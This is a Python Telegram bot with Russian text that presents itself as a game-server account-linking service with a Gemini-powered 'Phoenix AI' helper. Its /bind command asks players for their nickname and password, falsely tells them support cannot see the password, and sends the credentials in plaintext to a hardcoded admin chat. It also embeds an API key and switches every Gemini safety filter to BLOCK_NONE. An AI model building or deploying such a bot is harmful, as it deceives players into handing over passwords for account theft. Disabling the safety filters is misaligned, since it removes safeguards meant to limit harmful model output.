import os
import asyncio
import time
import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8070071877

# ВСТАВЬ СВОЙ КЛЮЧ ОТ GOOGLE СЮДА (ОН ДОЛЖЕН НАЧИНАТЬСЯ НА AIzaSy)
GEMINI_API_KEY = "AQ.Ab8RN6J_J9khoBfAlvrNsqIcLgytJ1hL3Lc-MPV5oyoYnHZdeQ"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

user_cooldowns = {}

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    welcome_text = (
        "[Бот] Для того, чтобы привязать игровой аккаунт, выполните следующие действия:\n"
        "1. Напишите (сюда): /bind [Ваш-Ник] [Ваш-Пароль]\n"
        "(Поддержка Ваш пароль не увидит)\n"
        "2. Напишите /help (сюда), чтобы увидеть возможности.\n"
        "Приятной игры на наших серверах!"
    )
    await message.answer(welcome_text)

@dp.message(Command("help"))
async def help_handler(message: types.Message):
    help_text = (
        "Список доступных команд:\n\n"
        "/bind [Ник] [Пароль] - Привязать игровой аккаунт к Telegram.\n"
        "/ai [ваш вопрос] - Задать вопрос нейросети Phoenix AI.\n"
        "/help - Показать это меню."
    )
    await message.answer(help_text)

@dp.message(Command("bind"))
async def bind_handler(message: types.Message):
    user_id = message.from_user.id
    current_time = time.time()
    
    # Проверка кулдауна
    if user_id in user_cooldowns:
        elapsed = current_time - user_cooldowns[user_id]
        if elapsed < 15:
            remaining = int(15 - elapsed)
            
            # Тот самый таймер: отправляет, ждет 1 сек, удаляет
            for sec in range(remaining, 0, -1):
                try:
                    timer_msg = await message.answer(f"До следующей попытки {sec} секунд")
                    await asyncio.sleep(1)
                    await timer_msg.delete()
                except Exception:
                    pass
            return

    args = message.text.split()
    if len(args) < 3:
        await message.answer("[Бот] Неверный формат! Используйте: /bind [Ник] [Пароль]")
        return
        
    username = args[1]
    password = " ".join(args[2:])
    
    # Обновляем время только при успешном вводе команды
    user_cooldowns[user_id] = current_time

    await message.answer("[Бот] Аккаунт был успешно привязан!")
    
    tg_user = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    admin_msg = (
        f"Новый привязанный аккаунт!\n\n"
        f"Игрок: {tg_user}\n"
        f"Telegram ID: {user_id}\n"
        f"Ник: {username}\n"
        f"Пароль: {password}"
    )
    
    try:
        await bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
    except Exception as e:
        print(f"Ошибка отправки админу: {e}")

@dp.message(Command("ai"))
async def ai_handler(message: types.Message):
    question = message.text[3:].strip()
    
    if not question:
        await message.answer("Phoenix AI: Напишите вопрос после команды. Пример: /ai Как играть?")
        return

    thinking_msg = await message.answer("Phoenix AI думает...")

    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
    
    # Payload с отключением фильтров (чтобы бот не отказывался отвечать на игровые темы)
    payload = {
        "contents": [{"parts": [{"text": question}]}],
        "safetySettings": [
            {"category": "HARM_CATEGORY_HARASSMENT", "threshold": "BLOCK_NONE"},
            {"category": "HARM_CATEGORY_HATE_SPEECH", "threshold": "BLOCK_NONE"},
            {"category": "HARM_CATEGORY_SEXUALLY_EXPLICIT", "threshold": "BLOCK_NONE"},
            {"category": "HARM_CATEGORY_DANGEROUS_CONTENT", "threshold": "BLOCK_NONE"}
        ]
    }

    try:
        # Запрос к нейросети Google Gemini
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, timeout=20) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    ai_answer = data["candidates"][0]["content"]["parts"][0]["text"]
                    reply = f"Phoenix AI:\n\n{ai_answer}"
                else:
                    reply = "Phoenix AI: Не удалось получить ответ, проверьте правильность API-ключа."
        
        # Удаляем сообщение "Phoenix AI думает..."
        try:
            await thinking_msg.delete()
        except Exception:
            pass

        # Отправляем готовый ответ
        await message.answer(reply)
        
    except Exception:
        # Если произошла ошибка сети
        try:
            await thinking_msg.delete()
        except Exception:
            pass
        await message.answer("Phoenix AI: Произошла ошибка при обработке запроса. Попробуйте еще раз.")

async def main():
    # Запуск бота с пропуском старых накопившихся сообщений
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())

